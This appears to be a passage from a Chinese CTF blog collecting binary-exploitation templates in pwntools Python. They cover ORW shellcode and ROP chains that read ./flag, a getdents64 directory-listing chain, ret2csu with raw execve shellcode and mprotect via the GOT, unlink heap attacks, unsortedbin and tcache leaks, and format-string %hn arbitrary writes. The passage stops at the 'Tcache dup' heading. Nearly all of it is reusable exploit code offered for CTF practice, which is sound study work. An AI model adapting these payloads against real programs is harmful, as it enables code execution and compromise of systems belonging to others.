<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
<p>​        // 不管是64位还是32位：“esp”为“./flag”所在地址，根据具体情况进行填写</p>
<p><strong>ROP链-64</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + fake_rbp</span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># open(bss_addr,0)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload) </span><br><span class="line">flag=<span class="string">&#x27;./flag&#x27;</span></span><br><span class="line">p.send(flag)</span><br></pre></td></tr></table></figure>
<p>当不知道程序名称时，用“getdents64”进行操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + fake_rbp</span><br><span class="line"><span class="comment"># read(0, bss_addr, 2)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># open(&quot;.&quot;)[3]</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># getdents64(3, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">217</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># open(bss_addr,0)[4]</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(4,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;.\x00&#x27;</span>) <span class="comment"># read(0, bss_addr, 2) &gt;&gt; open(&quot;.&quot;)</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) <span class="comment"># read(0, bss_addr, 0x30) &gt;&gt; open(&#x27;xxxx&#x27;+flag_s,0)</span></span><br><span class="line">flag_s=p.recv(<span class="number">20</span>)</span><br><span class="line">flag=<span class="string">&#x27;xxxx&#x27;</span>+flag_s</span><br><span class="line">p.send(flag)</span><br></pre></td></tr></table></figure>
<ul>
<li>先用“open(“.”)”打开当前目录</li>
<li>使用“getdents64(3, bss_addr + 0x200, 0x600)”打印目录到“bss_addr + 0x200”</li>
<li>使用“write(1, bss_addr + 0x200, 0x600)”打印目录</li>
<li>选择性接受文件名称（至于怎么接收，就要看程序了）</li>
</ul>
<h2 id="Shellcode模板"><a href="#Shellcode模板" class="headerlink" title="Shellcode模板"></a>Shellcode模板</h2><p><strong>ret2csu</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr=</span><br><span class="line">csu_end_addr=</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = padding + fake_ebp</span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. read shellcode to bss_addr</span></span><br><span class="line">shellcode=<span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.amd64.linux.sh(),arch=&#x27;amd64&#x27;) </span></span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(bss_addr)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x400</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. read bss_addr to got[0]</span></span><br><span class="line">shellcode_got= got[<span class="number">0</span>]</span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(shellcode_got)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x200</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(p64(bss_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. read mprotect_libc to got[1]</span></span><br><span class="line">mprot_got= got[<span class="number">1</span>]</span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(mprot_got)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x200</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(p64(mprotect_libc))</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, mprot_got, <span class="number">7</span>, <span class="number">0x1000</span>, <span class="number">0x600000</span>, main_addr)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, shellcode_got, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br></pre></td></tr></table></figure>
<p>这种进攻方式的核心就在于：把目标地址写入空白的GOT表</p>
<h2 id="Unlink攻击模板"><a href="#Unlink攻击模板" class="headerlink" title="Unlink攻击模板"></a>Unlink攻击模板</h2><p><strong>基于chunk_list</strong></p>
<p>通常就是这么个造型，根据具体需要进行修改（这种方式高libc版本用不了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk1</span></span><br><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk2</span></span><br><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk3</span></span><br><span class="line"></span><br><span class="line">list_addr_chunk2=list_addr+<span class="number">0x10</span> </span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line">payload+=p64(list_addr_chunk2-<span class="number">0x18</span>)</span><br><span class="line">payload+=p64(list_addr_chunk2-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xa0</span>)+p64(<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>,<span class="number">0xb0</span>,payload) <span class="comment">#fake_chunk2</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#list_addr_chunk2：就是目标chunk(chunk2)的FD指针，通过list_addr比较好寻找</span></span><br><span class="line"><span class="comment">#注意：例题的&quot;chunk[0]&quot;没有写入东西</span></span><br></pre></td></tr></table></figure>
<p>通常都是修改“chunk2”，释放“chunk3”，留一个“chunk1”进行初始化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg list_addr(buf[<span class="number">0</span>])</span><br><span class="line"><span class="number">0x602140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000e0a020</span></span><br><span class="line"><span class="number">0x602150</span>:	<span class="number">0x0000000000602138</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#fake_chunk2</span></span><br><span class="line"><span class="number">0x602160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment">#演示程序的buf[0]没有chunk</span></span><br><span class="line"><span class="comment">#buf[1]为chunk1，用于初始化</span></span><br><span class="line"><span class="comment">#buf[2]为fake_chunk2，是攻击对象</span></span><br><span class="line"><span class="comment">#buf[3]为chunk3，已经被free</span></span><br></pre></td></tr></table></figure>
<p>接下来修改“chunk2”就可以直接修改“list_addr”（“buf[0]”）了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target1&#x27;</span>]) <span class="comment">#fake_chunk0</span></span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target2&#x27;</span>]) <span class="comment">#fake_chunk1</span></span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target3&#x27;</span>]) <span class="comment">#fake_chunk2</span></span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>​        // 程序会在“buf[-1]”（buf[2-3]）开始写入数据</p>
<p><strong>基于heap_addr</strong>（泄露“heap_addr”+泄露“libc_base”+后续利用）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b00</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">heap_addr=leak_addr-<span class="number">240</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink for overlapping</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>) <span class="comment"># fake chunk-&gt;size</span></span><br><span class="line">payload+=p64(heap_addr+<span class="number">0x18</span>)+p64(heap_addr+<span class="number">0x20</span>)+p64(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0xb0</span>))<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># fake chunk-&gt;size=0xb1+0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># after unlink</span></span><br><span class="line">add(<span class="number">0xc0</span>,<span class="string">&#x27;AAAA&#x27;</span>)<span class="comment">#2(malloc form unsortedbin &quot;0x40+0x10&quot;+&quot;0x60+0x10&quot;)</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;BBBB&#x27;</span>)<span class="comment">#3(avoid top chunk and adjust the size of unsortedbin)</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># lead chunk1 to fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xc0</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>,<span class="number">0x71</span>,fake_target)) </span><br><span class="line"><span class="comment"># make fake_target to unsortedbin and then to fastbin(0x70)</span></span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment"># malloc the fake_target and change it</span></span><br></pre></td></tr></table></figure>
<ul>
<li>先构造泄露 heap_addr 的结构，再构造泄露 libc_base 的结构</li>
<li>要求 unlink 跳过中间那个chunk，基于这点构造“fake chunk-&gt;size”和“last chunk-&gt;fake presize”</li>
<li>释放chunk1，使chunk1进入fastbin</li>
<li>申请“0x60”字节的目的有二：防止 top chunk 合并，调整 unsortedbin 的大小（使其可以进入fastbin）</li>
<li>申请“0xC0”字节释放后，可以控制已经在fastbin中的chunk1，从而申请到目标地址</li>
</ul>
<h2 id="Unsortedbin-Leak模板"><a href="#Unsortedbin-Leak模板" class="headerlink" title="Unsortedbin Leak模板"></a>Unsortedbin Leak模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;C&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;D&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># 注意:这里要先释放后申请的chunk,不然程序不会打印(不知道原因)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>chunk1：leak heap_addr</li>
<li>chunk3：leak main_arena</li>
</ul>
<h2 id="格式化字符串漏洞模板"><a href="#格式化字符串漏洞模板" class="headerlink" title="格式化字符串漏洞模板"></a>格式化字符串漏洞模板</h2><p><strong>WAA模板</strong></p>
<p>通常需要在两片内存空间中，最后指向的地址相同（“偏移N”，“偏移M”）</p>
<p>例如：实现“ 目标地址 =&gt; shellcode ”</p>
<ul>
<li>找寻：最后指向地址相同的两片空间（“偏移N”，“偏移M”）</li>
<li>把“目标地址”写入“偏移N”</li>
<li>对应的“偏移M”最终也会指向“目标地址”</li>
<li>把“shellcode”写入“偏移M”（其实就是把“shellcode”写入“目标地址”了）</li>
</ul>
<p>通常需要分段写入地址，先写入高地址，所以模板为：（每次修改2字节）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">6</span>) <span class="comment"># last 6~8</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">3</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">4</span>) <span class="comment"># last 4~6</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">2</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">2</span>) <span class="comment"># last 2~4</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">1</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack) <span class="comment"># last 0~2</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>(shellcode_addr &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p><strong>leak模板</strong></p>
<p>格式化字符串的 leak 很简单，只需要输入若干“-%p”，并在GDB中确认格式化参数的地址后，就可以计算出各个地址的偏移了</p>
<p>​        // 前6个是寄存器中存放的值（在stack中也有），后续的信息才是重点</p>
<p>实现 leak 了之后，首先需要寻找“最后指向地址相同”的内存空间，方便以后的 WAA</p>
<h2 id="Tcache-Attack-模板"><a href="#Tcache-Attack-模板" class="headerlink" title="Tcache Attack 模板"></a>Tcache Attack 模板</h2><p>Tcache Attack的形式多种多样，遇到一个记录一个</p>
<p><strong>Tcache leak</strong></p>
<p>如果程序拥有“打印模块”，就先可以填满 Tcachebin，然后打 Unsortedbin leak</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">9</span>):</span><br><span class="line">	add(i,<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">	</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># chunk8 into Unsortedbin </span></span><br></pre></td></tr></table></figure>
<p>申请9个chunk：7个填Tcachebin，1个leak，1个防止和合并Top chunk</p>
<p><strong>Tcache dup</strong></p>
